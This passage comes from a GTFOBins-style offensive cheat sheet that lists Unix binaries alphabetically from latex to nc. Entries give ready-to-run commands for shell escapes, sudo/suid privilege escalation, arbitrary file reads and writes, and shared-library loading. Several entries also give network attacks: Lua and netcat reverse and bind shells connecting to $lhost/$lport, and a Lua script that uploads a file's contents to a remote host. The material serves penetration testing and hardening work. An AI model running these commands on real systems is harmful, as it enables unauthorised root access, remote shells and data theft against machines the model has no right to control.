### latex file-write

Write latex file write with the Gtfobins GTFOBins technique.

The file can only be written in the current directory, and the `.tex` extension is mandatory.

```sh title:"GTFOBins Write Latex File Write (latex file write (sudo / suid / unprivileged)"
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{$data}\immediate\closeout\tempfile\end{document}'
```
<!-- cheat
var data
-->

## latexmk

### latexmk shell

Spawn latexmk shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Latexmk Shell (latexmk shell (sudo / unprivileged)"
latexmk -pdf -pdflatex='/bin/sh #' /dev/null
```
<!-- cheat
-->

### latexmk file-read

Read latexmk file read with the Gtfobins GTFOBins technique.

The read file will be part of the output.

```sh title:"GTFOBins Read Latexmk File Read (latexmk file read (sudo / unprivileged)"
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{$file_in}\end{document}' >$tmp_file
latexmk -dvi $tmp_file
strings temp-file.dvi
```
<!-- cheat
var file_in
var tmp_file
-->

### latexmk inherit (inherits from perl)

Run latexmk inherit (inherits from perl) with the Gtfobins GTFOBins technique.

This allows to run Perl code (`...`).

```sh title:"GTFOBins Run Latexmk Inherit (inherits from Perl) (latexmk inherit from perl (sudo / unprivileged)"
latexmk -e '...'
```
<!-- cheat
-->

## ld.so

`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained with:  ``` strings /proc/self/exe | head -1 ```

### ld.so shell

Spawn ld.so shell with the Gtfobins GTFOBins technique.

The spawned process will be the loader, not the target executable, this might aid evasion. See <https://shyft.us/posts/20230526_linux_command_proxy.html> for more information.

```sh title:"GTFOBins Spawn Ld.so Shell (ld.so shell (sudo / suid / unprivileged)"
$ld_so /bin/sh
```
<!-- cheat
var ld_so
-->

#### ld.so shell - suid override
Spawn ld.so shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Ld.so Shell (ld.so shell (suid variant)"
$ld_so /bin/sh -p
```
<!-- cheat
var ld_so
-->

## ldconfig

### ldconfig library-load

Run ldconfig library load with the Gtfobins GTFOBins technique.

This allows to override one or more shared libraries (e.g., `libpcap`) globally, then triggers the execution by running a program that uses it, e.g., `ping`. This is particularly useful if the target binary is SUID. Beware though that it is easy to end up with a broken target system.  First identify the shared libraries used by the target program, for example:  ``` $ ldd /bin/ping | grep libcap         libcap.so.2 => $tmp_dir/libcap.so.2 (0x00007f8417eef000) ```  Then create the shared library override, named `libcap.so.2`, and put in in `$tmp_dir/`. The program might require some exported symbols from the library override, in that case make sure to add them (e.g., `void cap_get_flag() {}`).

```sh title:"GTFOBins Run Ldconfig Library Load (ldconfig library load (sudo / suid / unprivileged)"
echo $tmp_dir/ >$tmp_file
ldconfig -f $tmp_file
ping
```
<!-- cheat
var tmp_dir
var tmp_file
-->

## less

### less shell #1

Spawn less shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Less Shell #1 (less shell (sudo / suid / unprivileged)"
less /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### less shell #2

Spawn less shell #2 with the Gtfobins GTFOBins technique.

The optional `reset` command is needed to receive the echo back of the typed keystrokes.

```sh title:"GTFOBins Spawn Less Shell #2 (less shell (sudo / unprivileged)"
LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts
reset
```
<!-- cheat
-->

### less shell #3

Spawn less shell #3 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Less Shell #3 (less shell (sudo / unprivileged)"
VISUAL='/bin/sh -s --' less /etc/hosts
v
```
<!-- cheat
-->

### less command #1

Execute less command #1 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Less Command #1 (less command (unprivileged)"
cp $cmd_file ~/.lessfilter
less /etc/hosts
```
<!-- cheat
var cmd_file
-->

### less command #2

Execute less command #2 with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Less Command #2 (less command (sudo / unprivileged)"
LESSOPEN='$cmd_file # %s' less /etc/hosts
```
<!-- cheat
var cmd_file
-->

### less file-read #1

Read less file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Less File Read #1 (less file read (sudo / suid / unprivileged)"
less $file_in
```
<!-- cheat
var file_in
-->

### less file-read #2

Read less file read #2 with the Gtfobins GTFOBins technique.

This can be used to read another file, e.g., when invoked as a pager with some fixed content.

```sh title:"GTFOBins Read Less File Read #2 (less file read (sudo / suid / unprivileged)"
less /etc/hosts
:e $file_in
```
<!-- cheat
var file_in
-->

### less file-read #3

Read less file read #3 with the Gtfobins GTFOBins technique.

This can be used to read another file.

```sh title:"GTFOBins Read Less File Read #3 (less file read (sudo / unprivileged)"
LESSOPEN='echo $file_in # %s' less /etc/hosts
```
<!-- cheat
var file_in
-->

### less file-write

Write less file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Less File Write (less file write (sudo / suid / unprivileged)"
echo $data | less
s$file_out
q
```
<!-- cheat
var data
var file_out
-->

### less inherit (inherits from vi)

Run less inherit (inherits from vi) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Less Inherit (inherits from Vi) (less inherit from vi (sudo / suid / unprivileged)"
less /etc/hosts
v
```
<!-- cheat
-->

## lftp

### lftp shell

Spawn lftp shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Lftp Shell (lftp shell (sudo / suid / unprivileged)"
lftp -c '!/bin/sh'
```
<!-- cheat
-->

## links

### links file-read

Read links file read with the Gtfobins GTFOBins technique.

The result is displayed in a TUI interface.

```sh title:"GTFOBins Read Links File Read (links file read (sudo / suid / unprivileged)"
links $file_in
```
<!-- cheat
var file_in
-->

## ln

### ln privilege-escalation

Run ln privilege escalation with the Gtfobins GTFOBins technique.

This overrides `ln` itself with a symlink to a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `ln` by path. Warning, this is a destructive action.

```sh title:"GTFOBins Run Ln Privilege Escalation (ln privilege escalation (sudo)"
ln -fs /bin/sh /bin/ln
ln
```
<!-- cheat
-->

## loginctl

This might not work if run by unprivileged users depending on the system configuration.

### loginctl shell

Spawn loginctl shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Loginctl Shell (loginctl shell (sudo / unprivileged)"
loginctl user-status
!/bin/sh
```
<!-- cheat
-->

## logrotate

### logrotate shell

Spawn logrotate shell with the Gtfobins GTFOBins technique.

This command is picky about file permissions. An existing config file can be used as weel, provided that it contains a mail directive.

```sh title:"GTFOBins Spawn Logrotate Shell (logrotate shell (sudo)"
echo -e '$tmp_file {\nmail x@x.x\n}' >$tmp_file
echo '/bin/sh 0<&2 1>&2' >$tmp_file
logrotate -m $tmp_file -f $tmp_file
```
<!-- cheat
var tmp_file
-->

### logrotate file-read

Read logrotate file read with the Gtfobins GTFOBins technique.

The first word is returned in a error message.

```sh title:"GTFOBins Read Logrotate File Read (logrotate file read (sudo / suid / unprivileged)"
logrotate $file_in
```
<!-- cheat
var file_in
-->

### logrotate file-write

Write logrotate file write with the Gtfobins GTFOBins technique.

The content is written in a log file.

```sh title:"GTFOBins Write Logrotate File Write (logrotate file write (sudo / suid / unprivileged)"
logrotate -l $file_out $data
```
<!-- cheat
var data
var file_out
-->

## logsave

### logsave shell

Spawn logsave shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Logsave Shell (logsave shell (sudo / suid / unprivileged)"
logsave /dev/null /bin/sh -i
```
<!-- cheat
-->

#### logsave shell - suid override
Spawn logsave shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Logsave Shell (logsave shell (suid variant)"
logsave /dev/null /bin/sh -i -p
```
<!-- cheat
-->

## look

### look file-read

Read look file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Look File Read (look file read (sudo / suid / unprivileged)"
look '' $file_in
```
<!-- cheat
var file_in
-->

## lp

### lp upload

Upload lp upload with the Gtfobins GTFOBins technique.

This requires `cups` to be installed. Run the following on the attacker box beforehand:  1. `lpadmin -p printer -v socket://localhost -E` to create a virtual printer; 2. `lpadmin -d printer` to set the new printer as default; 3. `cupsctl --remote-any` to enable printing from the Internet.

```sh title:"GTFOBins Upload Lp Upload (lp upload (sudo / suid / unprivileged)"
lp $file_in -h $lhost
```
<!-- cheat
import tun_ip
var file_in
-->

## ltrace

### ltrace shell

Spawn ltrace shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Ltrace Shell (ltrace shell (sudo / unprivileged)"
ltrace -b -L /bin/sh
```
<!-- cheat
-->

### ltrace file-read

Read ltrace file read with the Gtfobins GTFOBins technique.

The file is parsed as a configuration file and its content is shown as error messages.

```sh title:"GTFOBins Read Ltrace File Read (ltrace file read (sudo / suid / unprivileged)"
ltrace -F $file_in /dev/null
```
<!-- cheat
var file_in
-->

### ltrace file-write

Write ltrace file write with the Gtfobins GTFOBins technique.

The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F $data`.

```sh title:"GTFOBins Write Ltrace File Write (ltrace file write (sudo / unprivileged)"
ltrace -s 999 -o $file_in ltrace -F $data
```
<!-- cheat
var data
var file_in
-->

## lua

### lua shell

Spawn lua shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Lua Shell (lua shell (sudo / suid / unprivileged)"
lua -e 'os.execute("/bin/sh")'
```
<!-- cheat
-->

### lua reverse-shell

Start lua reverse shell with the Gtfobins GTFOBins technique.

This requires `lua-socket` to be available.

```sh title:"GTFOBins Start Lua Reverse Shell (lua reverse shell (sudo / suid / unprivileged)"
lua -e '
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("$lhost",$lport);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'
```
<!-- cheat
import tun_ip
import lports
-->

### lua bind-shell

Start lua bind shell with the Gtfobins GTFOBins technique.

This requires `lua-socket` to be available.

```sh title:"GTFOBins Start Lua Bind Shell (lua bind shell (sudo / suid / unprivileged)"
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",$lport));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'
```
<!-- cheat
import lports
-->

### lua file-read

Read lua file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Lua File Read (lua file read (sudo / suid / unprivileged)"
lua -e 'local f=io.open("$file_in", "rb"); io.write(f:read("*a")); io.close(f);'
```
<!-- cheat
var file_in
-->

### lua file-write

Write lua file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Lua File Write (lua file write (sudo / suid / unprivileged)"
lua -e 'local f=io.open("$file_out", "wb"); f:write("$data"); io.close(f);'
```
<!-- cheat
var data
var file_out
-->

### lua download

Download lua download with the Gtfobins GTFOBins technique.

This requires `lua-socket` to be available.

```sh title:"GTFOBins Download Lua Download (lua download (sudo / suid / unprivileged)"
lua -e '
  local k=require("socket");
  local s=assert(k.bind("*",$lport));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("$file_out", "wb");
  f:write(d);
  io.close(f);'
```
<!-- cheat
import lports
var file_out
-->

### lua upload

Upload lua upload with the Gtfobins GTFOBins technique.

This requires `lua-socket` to be available.

```sh title:"GTFOBins Upload Lua Upload (lua upload (sudo / suid / unprivileged)"
lua -e '
  local f=io.open("$file_in", "rb")
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("$lhost",$lport);
  t:send(d);
  t:close();'
```
<!-- cheat
import tun_ip
import lports
var file_in
-->

## lualatex

### lualatex inherit (inherits from lua)

Run lualatex inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Lualatex Inherit (inherits from Lua) (lualatex inherit from lua (sudo / suid / unprivileged)"
lualatex -shell-escape '\directlua{...}\end'
```
<!-- cheat
-->

## luatex

### luatex inherit (inherits from lua)

Run luatex inherit (inherits from lua) with the Gtfobins GTFOBins technique.

This allows to run Lua code (`...`).

```sh title:"GTFOBins Run Luatex Inherit (inherits from Lua) (luatex inherit from lua (sudo / suid / unprivileged)"
luatex -shell-escape '\directlua{...}\end'
```
<!-- cheat
-->

## lwp-download

### lwp-download file-read

Read lwp download file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Lwp Download File Read (lwp-download file read (sudo / unprivileged)"
lwp-download file://$file_in /dev/stdout
```
<!-- cheat
var file_in
-->

### lwp-download file-write #1

Write lwp download file write #1 with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Lwp Download File Write #1 (lwp-download file write (sudo / unprivileged)"
echo $data >$tmp_file
lwp-download file://$tmp_file $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### lwp-download file-write #2

Write lwp download file write #2 with the Gtfobins GTFOBins technique.

This actually copies a file to a destination.

```sh title:"GTFOBins Write Lwp Download File Write #2 (lwp-download file write (sudo / unprivileged)"
lwp-download file://$file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

### lwp-download download

Download lwp download download with the Gtfobins GTFOBins technique.

The destination file `$file_out` can be omitted, in that case the file is saved to `input-file` in the current working directory.

```sh title:"GTFOBins Download Lwp Download Download (lwp-download download (sudo / unprivileged)"
lwp-download $scheme://$lhost$file_in $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

## lwp-request

### lwp-request file-read

Read lwp request file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Lwp Request File Read (lwp-request file read (sudo / unprivileged)"
lwp-request file://$file_in
```
<!-- cheat
var file_in
-->

## lxd

### lxd shell #1

Spawn lxd shell #1 with the Gtfobins GTFOBins technique.

The image (e.g., `ubuntu:16.04`) must be present already, otherwise it will be downloaded.

```sh title:"GTFOBins Spawn Lxd Shell #1 (lxd shell (sudo / suid)"
lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```
<!-- cheat
-->

### lxd shell #2

Spawn lxd shell #2 with the Gtfobins GTFOBins technique.

This requires steps to be run offline, then the resulting image must be uploaded to target. Build the local image with [lxd-alpine-builder](https://github.com/saghul/lxd-alpine-builder):  ``` git clone https://github.com/saghul/lxd-alpine-builder cd lxd-alpine-builder sudo ./build-alpine -a i686 ```

```sh title:"GTFOBins Spawn Lxd Shell #2 (lxd shell (sudo / suid)"
lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh
```
<!-- cheat
-->

## m4

### m4 shell

Spawn m4 shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn M4 Shell (m4 shell (sudo / suid / unprivileged)"
echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
```
<!-- cheat
-->

### m4 command

Execute m4 command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute M4 Command (m4 command (sudo / suid / unprivileged)"
echo 'esyscmd($cmd_file)' | m4
```
<!-- cheat
var cmd_file
-->

### m4 file-read

Read m4 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read M4 File Read (m4 file read (sudo / suid / unprivileged)"
m4 $file_in
```
<!-- cheat
var file_in
-->

## mail

### mail shell #1

Spawn mail shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Mail Shell #1 (mail shell (sudo / suid / unprivileged)"
mail --exec='!/bin/sh'
```
<!-- cheat
-->

### mail shell #2

Spawn mail shell #2 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Mail Shell #2 (mail shell (sudo / suid / unprivileged)"
mail -f /etc/hosts
!/bin/sh
```
<!-- cheat
-->

## make

### make shell

Spawn make shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Make Shell (make shell (sudo / suid / unprivileged)"
make --eval='$(shell /bin/sh 1>&0)' .
```
<!-- cheat
-->

### make file-read

Read make file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Make File Read (make file read (sudo / suid / unprivileged)"
make -s --eval='$(file >/dev/stdout,$(file <$file_in))' .
```
<!-- cheat
var file_in
-->

### make file-write

Create make file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Create Make File Write (make file write (sudo / suid / unprivileged)"
make -s --eval='$(file >$file_out,$data)' .
```
<!-- cheat
var data
var file_out
-->

## man

### man shell

Spawn man shell with the Gtfobins GTFOBins technique.

This requires GNU `troff` (`groff`) to be installed.

```sh title:"GTFOBins Spawn Man Shell (man shell (sudo / suid / unprivileged)"
man '-H/bin/sh #' man
```
<!-- cheat
-->

### man file-read

Read man file read with the Gtfobins GTFOBins technique.

The file is shown somehow formatted and displayed in the default pager.

```sh title:"GTFOBins Read Man File Read (man file read (sudo / suid / unprivileged)"
man $file_in
```
<!-- cheat
var file_in
-->

### man inherit (inherits from less)

Run man inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Man Inherit (inherits from Less) (man inherit from less (sudo / suid / unprivileged)"
man man
```
<!-- cheat
-->

## mawk

### mawk shell

Spawn mawk shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Mawk Shell (mawk shell (sudo / suid / unprivileged)"
mawk 'BEGIN {system("/bin/sh")}'
```
<!-- cheat
-->

### mawk file-read

Read mawk file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Mawk File Read (mawk file read (sudo / suid / unprivileged)"
mawk '//' $file_in
```
<!-- cheat
var file_in
-->

### mawk file-write

Write mawk file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Mawk File Write (mawk file write (sudo / suid / unprivileged)"
mawk 'BEGIN { print "$data" > "$file_out" }'
```
<!-- cheat
var data
var file_out
-->

## minicom

Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.

### minicom shell #1

Spawn minicom shell #1 with the Gtfobins GTFOBins technique.

Start the following command to open the TUI interface, then:  1. press `Ctrl-A o` and select `Filenames and paths`; 2. press `e`, type `/bin/sh`, then `Enter`; 3. Press `Esc` twice; 4. Press `Ctrl-A k` to drop the shell.  After the shell, exit with `Ctrl-A x`.

```sh title:"GTFOBins Spawn Minicom Shell #1 (minicom shell (sudo / suid / unprivileged)"
minicom -D /dev/null
```
<!-- cheat
-->

### minicom shell #2

Spawn minicom shell #2 with the Gtfobins GTFOBins technique.

After the shell, exit with `Ctrl-A x`.

```sh title:"GTFOBins Spawn Minicom Shell #2 (minicom shell (sudo / suid / unprivileged)"
echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >$tmp_file
minicom -D /dev/null -S $tmp_file
reset^J
```
<!-- cheat
var tmp_file
-->

## more

### more shell

Spawn more shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn More Shell (more shell (sudo / suid / unprivileged)"
more /etc/hosts
!/bin/sh
```
<!-- cheat
-->

### more file-read

Read more file read with the Gtfobins GTFOBins technique.

The file is displayed in the terminal interface.

```sh title:"GTFOBins Read More File Read (more file read (sudo / suid / unprivileged)"
more $file_in
```
<!-- cheat
var file_in
-->

## mosh-server

### mosh-server shell

Start mosh server shell with the Gtfobins GTFOBins technique.

This requires a valid SSH access.

```sh title:"GTFOBins Start Mosh Server Shell (mosh-server shell (sudo)"
mosh --server=mosh-server localhost /bin/sh
```
<!-- cheat
-->

## mosquitto

### mosquitto file-read

Read mosquitto file read with the Gtfobins GTFOBins technique.

The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.

```sh title:"GTFOBins Read Mosquitto File Read (mosquitto file read (sudo / suid / unprivileged)"
mosquitto -c $file_in
```
<!-- cheat
var file_in
-->

## mount

### mount privilege-escalation

Mount privilege escalation with the Gtfobins GTFOBins technique.

This overrides `mount` itself with a shell (or any other executable).

```sh title:"GTFOBins Mount Privilege Escalation (mount privilege escalation (sudo)"
mount -o bind /bin/sh /bin/mount
mount
```
<!-- cheat
-->

## msfconsole

### msfconsole inherit (inherits from irb)

Run msfconsole inherit (inherits from irb) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Msfconsole Inherit (inherits from Irb) (msfconsole inherit from irb (sudo / unprivileged)"
msfconsole
irb
```
<!-- cheat
-->

## msgattrib

### msgattrib file-read

Read msgattrib file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file.

```sh title:"GTFOBins Read Msgattrib File Read (msgattrib file read (sudo / suid / unprivileged)"
msgattrib -P $file_in
```
<!-- cheat
var file_in
-->

## msgcat

### msgcat file-read

Read msgcat file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file.

```sh title:"GTFOBins Read Msgcat File Read (msgcat file read (sudo / suid / unprivileged)"
msgcat -P $file_in
```
<!-- cheat
var file_in
-->

## msgconv

### msgconv file-read

Read msgconv file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file.

```sh title:"GTFOBins Read Msgconv File Read (msgconv file read (sudo / suid / unprivileged)"
msgconv -P $file_in
```
<!-- cheat
var file_in
-->

## msgfilter

### msgfilter shell

Spawn msgfilter shell with the Gtfobins GTFOBins technique.

The `kill` command is needed to spawn the shell only once. Instead of readinf from standard input, it can read files passed via the `-i` option.

```sh title:"GTFOBins Spawn Msgfilter Shell (msgfilter shell (sudo / suid / unprivileged)"
echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'
```
<!-- cheat
-->

#### msgfilter shell - suid override
Spawn msgfilter shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Msgfilter Shell (msgfilter shell (suid variant)"
echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
```
<!-- cheat
-->

### msgfilter file-read

Read msgfilter file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file. `/bin/cat` can be replaced with any other *filter* program.

```sh title:"GTFOBins Read Msgfilter File Read (msgfilter file read (sudo / suid / unprivileged)"
msgfilter -P -i $file_in /bin/cat
```
<!-- cheat
var file_in
-->

## msgmerge

### msgmerge file-read

Read msgmerge file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file.

```sh title:"GTFOBins Read Msgmerge File Read (msgmerge file read (sudo / suid / unprivileged)"
msgmerge -P $file_in /dev/null
```
<!-- cheat
var file_in
-->

## msguniq

### msguniq file-read

Read msguniq file read with the Gtfobins GTFOBins technique.

The file is parsed and displayed as a Java `.properties` file.

```sh title:"GTFOBins Read Msguniq File Read (msguniq file read (sudo / suid / unprivileged)"
msguniq -P $file_in
```
<!-- cheat
var file_in
-->

## mtr

### mtr file-read

Read mtr file read with the Gtfobins GTFOBins technique.

The file is actually parsed, thus the content is corrupted by error prints.

```sh title:"GTFOBins Read Mtr File Read (mtr file read (sudo / unprivileged)"
mtr --raw -F $file_in
```
<!-- cheat
var file_in
-->

## multitime

### multitime shell

Spawn multitime shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Multitime Shell (multitime shell (sudo / suid / unprivileged)"
multitime /bin/sh
```
<!-- cheat
-->

#### multitime shell - suid override
Spawn multitime shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Multitime Shell (multitime shell (suid variant)"
multitime /bin/sh -p
```
<!-- cheat
-->

## mutt

### mutt file-read

Read mutt file read with the Gtfobins GTFOBins technique.

The file is leaked as error messages.

```sh title:"GTFOBins Read Mutt File Read (mutt file read (sudo / unprivileged)"
mutt -F $file_in
```
<!-- cheat
var file_in
-->

## mv

### mv file-write

Write mv file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Mv File Write (mv file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
mv $tmp_file $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### mv privilege-escalation

Run mv privilege escalation with the Gtfobins GTFOBins technique.

This can be used to move and then read or write files from a restricted file systems or with elevated privileges.

```sh title:"GTFOBins Run Mv Privilege Escalation (mv privilege escalation (sudo / suid)"
mv $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## mypy

### mypy file-read

Read mypy file read with the Gtfobins GTFOBins technique.

Partial content is leaked as error messages.

```sh title:"GTFOBins Read Mypy File Read (mypy file read (sudo / unprivileged)"
mypy $file_in
```
<!-- cheat
var file_in
-->

### mypy file-write

Write mypy file write with the Gtfobins GTFOBins technique.

Partial content is leaked as error messages inside some XML tags.

```sh title:"GTFOBins Write Mypy File Write (mypy file write (sudo / unprivileged)"
mypy $file_in --junit-xml $file_out
```
<!-- cheat
var file_in
var file_out
-->

## mysql

A valid MySQL server must be available to connect to.

### mysql shell

Spawn mysql shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Mysql Shell (mysql shell (sudo / suid / unprivileged)"
mysql -e '\! /bin/sh'
```
<!-- cheat
-->

### mysql library-load

Run mysql library load with the Gtfobins GTFOBins technique.

The following loads the `$lib` shared object.

```sh title:"GTFOBins Run Mysql Library Load (mysql library load (sudo / suid / unprivileged)"
mysql --default-auth ../../../../.$lib
```
<!-- cheat
var lib
-->

## nano

### nano shell #1

Spawn nano shell #1 with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Nano Shell #1 (nano shell (sudo / suid / unprivileged)"
nano
^R^X
reset; sh 1>&0 2>&0
```
<!-- cheat
-->

### nano shell #2

Spawn nano shell #2 with the Gtfobins GTFOBins technique.

The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.

```sh title:"GTFOBins Spawn Nano Shell #2 (nano shell (sudo / suid / unprivileged)"
nano -s /bin/sh
/bin/sh
^T^T
```
<!-- cheat
-->

#### nano shell #2 - suid override
Spawn nano shell #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Nano Shell #2 (nano shell (suid variant)"
nano -s '/bin/sh -p'
/bin/sh -p
^T^T
```
<!-- cheat
-->

### nano file-read

Read nano file read with the Gtfobins GTFOBins technique.

The file content is displayed in the terminal interface.

```sh title:"GTFOBins Read Nano File Read (nano file read (sudo / suid / unprivileged)"
nano $file_in
```
<!-- cheat
var file_in
-->

### nano file-write

Write nano file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Nano File Write (nano file write (sudo / suid / unprivileged)"
nano $file_out
$data
^O
```
<!-- cheat
var data
var file_out
-->

## nasm

### nasm file-read

Read nasm file read with the Gtfobins GTFOBins technique.

The file content is treated as command line options and disclosed throught error messages.

```sh title:"GTFOBins Read Nasm File Read (nasm file read (sudo / suid / unprivileged)"
nasm -@ $file_in
```
<!-- cheat
var file_in
-->

## nawk

Alias of [gawk](#gawk). All techniques from `gawk` apply.

## nc

### nc reverse-shell

Start nc reverse shell with the Gtfobins GTFOBins technique.

This only works with netcat traditional.

```sh title:"GTFOBins Start Nc Reverse Shell (nc reverse shell (sudo / suid / unprivileged)"
nc -e /bin/sh $lhost $lport
```
<!-- cheat
import tun_ip
import lports
-->

### nc bind-shell

Start nc bind shell with the Gtfobins GTFOBins technique.

This only works with netcat traditional.

```sh title:"GTFOBins Start Nc Bind Shell (nc bind shell (sudo / suid / unprivileged)"
nc -l -p $lport -e /bin/sh
```
<!-- cheat
import lports
-->

### nc download #1

Download nc download #1 with the Gtfobins GTFOBins technique.

The file is actually written by the invoking shell.

```sh title:"GTFOBins Download Nc Download #1 (nc download (sudo / suid / unprivileged)"
nc -l -p $lport >$file_out
```
<!-- cheat
import lports
var file_out
-->

### nc download #2

Download nc download #2 with the Gtfobins GTFOBins technique.

The file is actually written by the invoking shell.

```sh title:"GTFOBins Download Nc Download #2 (nc download (sudo / suid / unprivileged)"
nc $lhost $lport >$file_out
```
<!-- cheat
import tun_ip
import lports
var file_out
-->

### nc upload #1

Upload nc upload #1 with the Gtfobins GTFOBins technique.

The file is actually read by the invoking shell.

